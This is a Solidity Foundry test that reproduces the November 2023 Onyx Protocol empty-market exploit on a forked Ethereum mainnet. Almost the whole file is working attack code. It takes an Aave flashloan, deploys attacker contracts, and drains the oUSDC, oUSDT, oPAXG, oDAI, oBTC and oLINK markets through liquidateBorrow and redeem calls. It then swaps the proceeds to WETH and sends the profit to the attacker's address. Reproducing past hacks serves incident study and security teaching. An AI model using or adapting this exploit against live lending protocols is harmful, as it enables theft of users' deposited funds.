// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import { TestHarness} from "../../TestHarness.sol"; 
import { TokenBalanceTracker} from '../../modules/TokenBalanceTracker.sol';
import { IERC20 } from "../../interfaces/IERC20.sol";
import { IWETH9 } from "../../interfaces/IWETH9.sol";
import { IUniswapV2Pair } from "../../utils/IUniswapV2Pair.sol";
import { IUniswapV2Router02 } from "../../utils/IUniswapV2Router.sol";
import { Attacker1Contracts } from "./Attacker1Contracts.sol";
import { Attacker2Contracts } from "./Attacker2Contracts.sol";

// Onyx Protocol exploit that occurred on November 2, 2023, which resulted in a loss of approximately $ 2.1M. 
// This was an empty market attack that exploited a known vulnerability in Compound v2 forks.



interface IComptroller {
    function liquidateCalculateSeizeTokens( address cTokenBorrowed,address cTokenCollateral,uint256 actualRepayAmount) external view returns (uint256, uint256);
    function enterMarkets(address[] memory cTokens) external returns (uint256[] memory);
}

interface IAaveFlashloan {
    function flashLoanSimple(address receiverAddress,address asset,uint256 amount,bytes calldata params,uint16 referralCode) external;
}

interface ICERC20Delegator {
    function balanceOf(address owner) external view returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
    function liquidateBorrow(address borrower,uint256 repayAmount,address cTokenCollateral) external returns (uint256);
    function mint(uint256 mintAmount) external returns (uint256);
    function totalSupply() external view returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
    function getAccountSnapshot(address account) external view returns (uint256, uint256, uint256, uint256);
    function getCash() external view returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function underlying() external view returns (address);
}


interface IcrETH {
    function borrow(uint256 borrowAmount) external returns (uint256);
    function getCash() external view returns (uint256);
    function liquidateBorrow(address borrower, address cTokenCollateral) external payable;
}

interface IUSDT {
    function approve(address _spender, uint256 _value) external;
    function balanceOf(address owner) external view returns (uint256);
    function transfer(address _to, uint256 _value) external;
}

contract Exploit_Onyx_Protocol is TestHarness, TokenBalanceTracker {

    address internal attacker = 0x085bDfF2C522e8637D4154039Db8746bb8642BfF;

    IAaveFlashloan private constant AaveV3 = IAaveFlashloan(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    IWETH9 private constant WETH = IWETH9(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
    IERC20 private constant PEPE = IERC20(0x6982508145454Ce325dDbE47a25d4ec3d2311933);
    IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IUSDT private constant USDT = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 private constant PAXG = IERC20(0x45804880De22913dAFE09f4980848ECE6EcbAf78);
    IERC20 private constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 private constant WBTC = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
    IERC20 private constant LINK = IERC20(0x514910771AF9Ca656af840dff83E8264EcF986CA);


    ICERC20Delegator private constant oPEPE = ICERC20Delegator(payable(0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750));
    ICERC20Delegator private constant oUSDC = ICERC20Delegator(payable(0x8f35113cFAba700Ed7a907D92B114B44421e412A));
    ICERC20Delegator private constant oUSDT = ICERC20Delegator(payable(0xbCed4e924f28f43a24ceEDec69eE21ed4D04D2DD));
    ICERC20Delegator private constant oPAXG = ICERC20Delegator(payable(0x0C19D213e9f2A5cbAA4eC6E8eAC55a22276b0641));
    ICERC20Delegator private constant oDAI = ICERC20Delegator(payable(0x830DAcD5D0a62afa92c9Bc6878461e9cD317B085));
    ICERC20Delegator private constant oBTC = ICERC20Delegator(payable(0x1933f1183C421d44d531Ed40A5D2445F6a91646d));
    ICERC20Delegator private constant oLINK = ICERC20Delegator(payable(0xFEe4428b7f403499C50a6DA947916b71D33142dC));

    // Onyx ETH (oETHER)
    IcrETH private constant oETHER = IcrETH(payable(0x714bD93aB6ab2F0bcfD2aEaf46A46719991d0d79));

    IUniswapV2Pair private constant pairPepeWeth = IUniswapV2Pair(0xA43fe16908251ee70EF74718545e4FE6C5cCEc9f);
    IUniswapV2Pair private constant pairUsdcWeth = IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);
    IUniswapV2Pair private constant pairWethUsdt = IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);
    IUniswapV2Pair private constant pairPaxgWeth = IUniswapV2Pair(0x9C4Fe5FFD9A9fC5678cFBd93Aa2D4FD684b67C4C);
    IUniswapV2Pair private constant pairDaiWeth = IUniswapV2Pair(0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11);
    IUniswapV2Pair private constant pairWbtcWeth = IUniswapV2Pair(0xBb2b8038a1640196FbE3e38816F3e67Cba72D940);
    IUniswapV2Pair private constant pairLinkWeth = IUniswapV2Pair(0xa2107FA5B38d9bbd2C461D6EDf11B11A50F6b974);
    IUniswapV2Router02 private constant Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);


    function setUp() external {
        // Fork after added PEPE token market through Proposal 22
        // Block = 18476512 when attacker created a attack smart contract 
        cheat.createSelectFork('mainnet',18476512);
        
        deal(address(this), 0);
        
        addTokenToTracker(address(WETH));
        addTokenToTracker(address(PEPE));
        updateBalanceTracker(attacker);
    }

    function test_attack() external {
        console.log('------- INITIAL BALANCES -------');
        logBalancesWithLabel('Attacker', attacker);
        
        console.log('------- STEP 1: Get the flashloan -------');
        AaveV3.flashLoanSimple(address(this), address(WETH), 4000 * 1e18, bytes(""), 0);

        console.log('------- FINAL BALANCES -------');
        logBalancesWithLabel('Attacker', attacker);

    }

    function executeOperation(
        address /* asset */,
        uint256 amount,
        uint256 premium,
        address /* initiator */,
        bytes calldata /* params */
    ) external returns (bool) {
        logBalancesWithLabel('Attacker contract', address(this));
        approveAll();
        // Calculate reserve in Uniswap for pair PEPE/WETH
        (uint112 reservePEPE, uint112 reserveWETH,) = pairPepeWeth.getReserves();

        console.log('------- STEP 2: Swap all WETH to PEPE ------');
        
        uint256 amountOut = calcAmountOut(reservePEPE, reserveWETH, WETH.balanceOf(address(this)));
        swapWethToPepe(amountOut);
        // Transfer a huge amount of PEPE
        logBalancesWithLabel('Attacker contract', address(this));

       
        // Transfer all PEPE to Attacker1Contract
        
        Attacker1Contracts attacker1Contracts = new Attacker1Contracts();
        PEPE.transfer(address(attacker1Contracts), PEPE.balanceOf(address(this)));
        attacker1Contracts.start();
        
        oETHER.liquidateBorrow{value: 1 }(address(attacker1Contracts), address(oPEPE));
        oPEPE.redeem(oPEPE.balanceOf(address(this)));
        WETH.deposit{value: address(this).balance}();
        
       

        
        {
            exploitToken(oUSDC);
            (uint112 reserveUSDC, uint112 reserveWETH1,) = pairUsdcWeth.getReserves();
            amountOut = calcAmountOut(reserveWETH1, reserveUSDC, USDC.balanceOf(address(this)));
            swapUsdcToWeth(amountOut);
        }

        

        {
            exploitToken(oUSDT);
            (uint112 reserveWETH2, uint112 reserveUSDT,) = pairWethUsdt.getReserves();
            amountOut = calcAmountOut(reserveUSDT, reserveWETH2, USDT.balanceOf(address(this)));
            swapUsdtToWeth(amountOut);
        }
        
        {
            exploitToken(oPAXG);
            (uint112 reservePAXG, uint112 reserveWETH3,) = pairPaxgWeth.getReserves();
            amountOut = calcAmountOut(reserveWETH3, reservePAXG, PAXG.balanceOf(address(this)));
            swapPaxgToWeth(amountOut);
        }
        
       
        {
            exploitToken(oDAI);
            (uint112 reserveDAI, uint112 reserveWETH4,) = pairDaiWeth.getReserves();
            amountOut = calcAmountOut(reserveWETH4, reserveDAI, DAI.balanceOf(address(this)));
            swapDaiToWeth(amountOut);
        }

        
        {
            exploitToken(oBTC);
            (uint112 reserveWBTC, uint112 reserveWETH5,) = pairWbtcWeth.getReserves();
            amountOut = calcAmountOut(reserveWETH5, reserveWBTC, WBTC.balanceOf(address(this)));
            swapWbtcToWeth(amountOut);
        }

        
        {
            exploitToken(oLINK);
            (uint112 reserveLINK, uint112 reserveWETH6,) = pairLinkWeth.getReserves();
            amountOut = calcAmountOut(reserveWETH6, reserveLINK, LINK.balanceOf(address(this)));

            swapLinkToWeth(amountOut);
        }
        // Swap some PEPE token to repay the loan
        swapPepeToWeth(amount + premium - WETH.balanceOf(address(this)));

        WETH.approve(address(AaveV3), amount + premium);

        uint256 wethBalance = WETH.balanceOf(address(this));
        WETH.transfer(attacker, wethBalance - (amount + premium));

        return true;
    }

    receive() external payable {}

    function swapWethToPepe(
        uint256 _amountOut
    ) internal {
        address[] memory path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(PEPE);
        Router.swapExactTokensForTokens(
            WETH.balanceOf(address(this)), (_amountOut - _amountOut / 100), path, address(this), block.timestamp + 3600
        );
    }

    function swapUsdcToWeth(
        uint256 _amountOut
    ) internal {
        address[] memory path = new address[](2);
        path[0] = address(USDC);
        path[1] = address(WETH);
        Router.swapExactTokensForTokens(
            USDC.balanceOf(address(this)), (_amountOut - _amountOut / 100), path, address(this), block.timestamp + 3600
        );
    }

    function swapUsdtToWeth(
        uint256 _amountOut
    ) internal {
        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(WETH);
        Router.swapExactTokensForTokens(
            USDT.balanceOf(address(this)), (_amountOut - _amountOut / 100), path, address(this), block.timestamp + 3600
        );
    }

    function swapPaxgToWeth(
        uint256 _amountOut
    ) internal {
        address[] memory path = new address[](2);
        path[0] = address(PAXG);
        path[1] = address(WETH);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            PAXG.balanceOf(address(this)), (_amountOut - _amountOut / 100), path, address(this), block.timestamp + 3600
        );
    }

    function swapDaiToWeth(
        uint256 _amountOut
    ) internal {
        address[] memory path = new address[](2);
        path[0] = address(DAI);
        path[1] = address(WETH);
        Router.swapExactTokensForTokens(
            DAI.balanceOf(address(this)), (_amountOut - _amountOut / 100), path, address(this), block.timestamp + 3600
        );
    }

    function swapWbtcToWeth(
        uint256 _amountOut
    ) internal {
        address[] memory path = new address[](2);
        path[0] = address(WBTC);
        path[1] = address(WETH);
        Router.swapExactTokensForTokens(
            WBTC.balanceOf(address(this)), (_amountOut - _amountOut / 100), path, address(this), block.timestamp + 3600
        );
    }

    function swapLinkToWeth(
        uint256 _amountOut
    ) internal {
        address[] memory path = new address[](2);
        path[0] = address(LINK);
        path[1] = address(WETH);
        Router.swapExactTokensForTokens(
            LINK.balanceOf(address(this)), (_amountOut - _amountOut / 100), path, address(this), block.timestamp + 3600
        );
    }

    function swapPepeToWeth(uint256 minAmount) internal {
        address[] memory path = new address[](2);
        path[0] = address(PEPE);
        path[1] = address(WETH);
        Router.swapExactTokensForTokens(
            PEPE.balanceOf(address(this)), minAmount, path, address(this), block.timestamp + 3600
        );
    }

    function approveAll() internal {
        WETH.approve(address(Router), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);
        USDC.approve(address(oUSDC), type(uint256).max);
        USDT.approve(address(Router), type(uint256).max);
        USDT.approve(address(oUSDT), type(uint256).max);
        PAXG.approve(address(Router), type(uint256).max);
        PAXG.approve(address(oPAXG), type(uint256).max);
        DAI.approve(address(Router), type(uint256).max);
        DAI.approve(address(oDAI), type(uint256).max);
        WBTC.approve(address(Router), type(uint256).max);
        WBTC.approve(address(oBTC), type(uint256).max);
        LINK.approve(address(Router), type(uint256).max);
        LINK.approve(address(oLINK), type(uint256).max);
        PEPE.approve(address(Router), type(uint256).max);
    }

    function calcAmountOut(uint112 reserve1, uint112 reserve2, uint256 tokenBalance) internal pure returns (uint256) {
        uint256 a = (tokenBalance * 997);
        uint256 b = a * reserve1;
        uint256 c = (reserve2 * 1000) + a;
        return b / c;
    }

    function exploitToken(
        ICERC20Delegator onyxToken
    ) internal {
        Attacker2Contracts attacker2Contracts = new Attacker2Contracts(onyxToken);
        PEPE.transfer(address(attacker2Contracts), PEPE.balanceOf(address(this)));
        attacker2Contracts.start(onyxToken);
        onyxToken.liquidateBorrow(address(attacker2Contracts), 1, address(oPEPE));
        oPEPE.redeem(oPEPE.balanceOf(address(this)));
    }
}

